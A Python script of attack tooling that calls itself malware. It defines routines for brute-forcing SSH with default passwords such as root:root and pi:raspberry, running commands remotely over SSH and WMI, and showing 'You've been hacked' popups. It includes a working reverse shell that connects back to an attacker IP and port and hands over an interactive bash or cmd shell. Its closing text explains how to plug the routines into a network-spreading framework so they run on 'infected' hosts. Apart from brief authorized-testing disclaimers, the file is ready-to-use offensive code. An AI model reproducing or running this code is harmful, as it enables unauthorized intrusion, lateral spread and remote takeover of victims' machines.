#!/usr/bin/env python3


import subprocess
import socket
import platform
import logging
from typing import Dict, Optional

# Try to import optional libraries for advanced features
try:
    import paramiko  # For SSH
    HAS_PARAMIKO = True
except ImportError:
    HAS_PARAMIKO = False
    print("⚠️  paramiko not installed - SSH functionality disabled")
    print("   Install with: pip3 install paramiko")

try:
    import wmi  # For Windows WMI
    HAS_WMI = True
except ImportError:
    HAS_WMI = False
    print("⚠️  wmi not installed - Windows WMI functionality disabled")
    print("   Install with: pip3 install wmi")

logging.basicConfig(level=logging.INFO)
logger = logging.getLogger(__name__)


class RealCommandExecutor:

    
    def __init__(self):
        self.credentials = {
            # Common default credentials hackers try
            'ssh': [
                ('root', 'root'),
                ('admin', 'admin'),
                ('pi', 'raspberry'),
                ('user', 'password'),
            ],
            'smb': [
                ('Administrator', 'password'),
                ('admin', 'admin'),
            ]
        }
    
    def execute_ssh_command(self, target_ip: str, username: str, password: str, command: str) -> Dict:
        """
        Execute command via SSH (Linux/Unix)
        This is REAL - will actually execute on target!
        """
        if not HAS_PARAMIKO:
            return {'success': False, 'error': 'paramiko not installed'}
        
        try:
            logger.info(f"[SSH] Connecting to {target_ip} as {username}...")
            
            # Create SSH client
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            
            # Connect to target
            ssh.connect(
                hostname=target_ip,
                username=username,
                password=password,
                timeout=10,
                banner_timeout=10
            )
            
            logger.info(f"[SSH] ✓ Connected! Executing: {command}")
            
            # Execute command
            stdin, stdout, stderr = ssh.exec_command(command)
            
            # Get output
            output = stdout.read().decode('utf-8', errors='ignore')
            error = stderr.read().decode('utf-8', errors='ignore')
            
            ssh.close()
            
            logger.info(f"[SSH] ✓ Command executed successfully")
            
            return {
                'success': True,
                'output': output,
                'error': error,
                'method': 'SSH'
            }
            
        except paramiko.AuthenticationException:
            logger.error(f"[SSH] ✗ Authentication failed")
            return {'success': False, 'error': 'Authentication failed'}
        except Exception as e:
            logger.error(f"[SSH] ✗ Error: {e}")
            return {'success': False, 'error': str(e)}
    
    def execute_windows_wmi(self, target_ip: str, username: str, password: str, command: str) -> Dict:
        """
        Execute command via WMI (Windows)
        This is REAL - will actually execute on Windows target!
        """
        if not HAS_WMI:
            return {'success': False, 'error': 'wmi not installed (Windows only)'}
        
        try:
            logger.info(f"[WMI] Connecting to {target_ip} as {username}...")
            
            # Connect to remote Windows machine
            connection = wmi.WMI(
                computer=target_ip,
                user=username,
                password=password
            )
            
            logger.info(f"[WMI] ✓ Connected! Executing: {command}")
            
            # Execute command remotely
            process_id, return_value = connection.Win32_Process.Create(
                CommandLine=f'cmd.exe /c {command}'
            )
            
            if return_value == 0:
                logger.info(f"[WMI] ✓ Command executed successfully (PID: {process_id})")
                return {
                    'success': True,
                    'output': f'Process created with PID: {process_id}',
                    'method': 'WMI'
                }
            else:
                logger.error(f"[WMI] ✗ Execution failed (code: {return_value})")
                return {'success': False, 'error': f'WMI error code: {return_value}'}
                
        except Exception as e:
            logger.error(f"[WMI] ✗ Error: {e}")
            return {'success': False, 'error': str(e)}
    
    def execute_local_command(self, command: str) -> Dict:
        """
        Execute command on LOCAL machine
        This shows what happens after infection
        """
        try:
            logger.info(f"[LOCAL] Executing: {command}")
            
            # Execute command
            result = subprocess.run(
                command,
                shell=True,
                capture_output=True,
                text=True,
                timeout=30
            )
            
            logger.info(f"[LOCAL] ✓ Command executed")
            
            return {
                'success': True,
                'output': result.stdout,
                'error': result.stderr,
                'method': 'LOCAL',
                'returncode': result.returncode
            }
            
        except Exception as e:
            logger.error(f"[LOCAL] ✗ Error: {e}")
            return {'success': False, 'error': str(e)}
    
    def brute_force_ssh(self, target_ip: str, command: str) -> Dict:
        """
        Try common credentials to access SSH
        This is how hackers gain initial access
        """
        if not HAS_PARAMIKO:
            return {'success': False, 'error': 'paramiko not installed'}
        
        logger.info(f"[BRUTE] Attempting SSH brute force on {target_ip}")
        
        for username, password in self.credentials['ssh']:
            logger.info(f"[BRUTE] Trying {username}:{password}")
            
            result = self.execute_ssh_command(target_ip, username, password, command)
            
            if result['success']:
                logger.info(f"[BRUTE] ✓ Success with {username}:{password}")
                return result
        
        logger.error(f"[BRUTE] ✗ All credentials failed")
        return {'success': False, 'error': 'All credentials failed'}
    
    def display_message_real(self, message: str) -> Dict:
        """
        Display REAL message on current machine
        This actually shows a popup/notification
        """
        system = platform.system()
        
        try:
            if system == "Linux":
                # Use notify-send for Linux
                result = subprocess.run([
                    'notify-send',
                    'HACKED!',
                    message,
                    '--urgency=critical',
                    '--icon=dialog-warning'
                ], capture_output=True)
                
                if result.returncode == 0:
                    logger.info(f"[NOTIFY] ✓ Notification displayed")
                    return {'success': True, 'output': 'Notification displayed'}
                else:
                    # Fallback to wall command
                    subprocess.run(['wall', message])
                    return {'success': True, 'output': 'Message sent via wall'}
                    
            elif system == "Windows":
                # Use msg command for Windows
                subprocess.run(['msg', '*', message])
                return {'success': True, 'output': 'Message sent via msg'}
                
            else:
                # Fallback - just echo to terminal
                print(f"\n{'='*60}")
                print(f"MESSAGE: {message}")
                print(f"{'='*60}\n")
                return {'success': True, 'output': 'Message echoed to terminal'}
                
        except Exception as e:
            logger.error(f"[NOTIFY] ✗ Error: {e}")
            return {'success': False, 'error': str(e)}
    
    def create_reverse_shell(self, attacker_ip: str, attacker_port: int = 4444) -> Dict:
        """
        Create a reverse shell connection back to attacker
        This gives the attacker full control
        
        ⚠️ DANGEROUS - Only use in authorized testing!
        """
        try:
            logger.info(f"[REVERSE] Creating reverse shell to {attacker_ip}:{attacker_port}")
            
            # Connect back to attacker
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((attacker_ip, attacker_port))
            
            logger.info(f"[REVERSE] ✓ Connected to attacker")
            
            # Redirect stdin/stdout/stderr to socket
            import os
            os.dup2(s.fileno(), 0)  # stdin
            os.dup2(s.fileno(), 1)  # stdout
            os.dup2(s.fileno(), 2)  # stderr
            
            # Spawn shell
            if platform.system() == "Windows":
                subprocess.call(['cmd.exe'])
            else:
                subprocess.call(['/bin/bash', '-i'])
            
            return {'success': True, 'output': 'Reverse shell established'}
            
        except Exception as e:
            logger.error(f"[REVERSE] ✗ Error: {e}")
            return {'success': False, 'error': str(e)}


def demo_real_execution():
    """
    Demonstration of real command execution
    """
    print("""
╔═══════════════════════════════════════════════════════════════════╗
║  ⚠️  REAL COMMAND EXECUTION DEMONSTRATION                         ║
║  This code can execute ACTUAL commands                            ║
║  Use ONLY in authorized testing environments                      ║
╚═══════════════════════════════════════════════════════════════════╝
""")
    
    executor = RealCommandExecutor()
    
    # Example 1: Execute command on LOCAL machine (safe to demo)
    print("\n" + "="*70)
    print("EXAMPLE 1: Local Command Execution")
    print("="*70)
    print("Executing: echo 'Hello from malware!'")
    
    result = executor.execute_local_command("echo 'Hello from malware!'")
    if result['success']:
        print(f"Output: {result['output']}")
    
    # Example 2: Show real notification on YOUR machine
    print("\n" + "="*70)
    print("EXAMPLE 2: Display Message (Real)")
    print("="*70)
    print("Displaying notification on YOUR machine...")
    
    result = executor.display_message_real("Hello World! You've been hacked!")
    print(f"Result: {result}")
    
    # Example 3: How to connect to remote machine
    print("\n" + "="*70)
    print("EXAMPLE 3: Remote Execution (Requires credentials)")
    print("="*70)
    print("""
To execute on remote machine, you would use:

# SSH (Linux):
result = executor.execute_ssh_command(
    target_ip="192.168.1.100",
    username="admin",
    password="password123",
    command="echo 'Hacked!'"
)

# WMI (Windows):
result = executor.execute_windows_wmi(
    target_ip="192.168.1.100",
    username="Administrator", 
    password="password123",
    command='msg * "You have been hacked!"'
)

# Brute force SSH:
result = executor.brute_force_ssh(
    target_ip="192.168.1.100",
    command="wall 'System compromised!'"
)
""")
    
    print("\n" + "="*70)
    print("INTEGRATION WITH YOUR FRAMEWORK")
    print("="*70)
    print("""
To add real execution to your networkSpreading.py:

1. Replace simulation code in _execute_remote_command():

   def _execute_remote_command(self, target: NetworkTarget, command: str) -> Dict:
       executor = RealCommandExecutor()
       
       if target.os_type == "Windows":
           # Use WMI
           return executor.execute_windows_wmi(
               target.ip,
               "Administrator",
               "password123",
               command
           )
       else:
           # Use SSH
           return executor.execute_ssh_command(
               target.ip,
               "root",
               "toor",
               command
           )

2. After infection, execute commands:

   framework.execute_on_infected("echo 'Hacked!'")
   framework.display_message_on_infected("You've been hacked!")

⚠️  Remember: Only use on systems you own or have permission to test!
""")


if __name__ == "__main__":
    demo_real_execution()
